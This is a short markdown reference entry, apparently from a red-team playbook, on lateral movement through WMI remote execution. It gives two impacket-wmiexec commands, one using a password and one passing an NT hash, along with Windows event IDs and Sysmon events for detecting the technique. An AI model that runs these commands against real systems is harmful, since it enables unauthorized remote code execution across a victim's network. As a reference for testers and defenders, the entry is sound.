---
id: wmi_exec
type: technique
label: "WMI / WinRM / SMB remote execution"
phase: "lateral"
tools: ["impacket", "netexec", "evilwinrm"]
cve: null
detect: "WMI-Activity operational log; 4688; 7045 service creation."
mitre: "T1047 / T1021.002 / T1021.006"
tag: null
---


# WMI / WinRM / SMB remote execution

### Affected object / attribute
**WMI `Win32_Process::Create`** on the target.

### Concept (deep)
WMI executes commands remotely; `wmiexec.py` runs semi-interactively, no service binary dropped.

### Commands
```bash
# ── wmiexec with password ───────────────────────────────────────────
impacket-wmiexec corp.local/admin:'Password123!'@10.10.10.6

# ── wmiexec with hash ───────────────────────────────────────────────
impacket-wmiexec -hashes :<nt> corp.local/admin@10.10.10.6
```

### Detection
**4688** with parent `WmiPrvSE.exe`; WMI activity (**5857/5860/5861**); **Sysmon 1/11**.

---
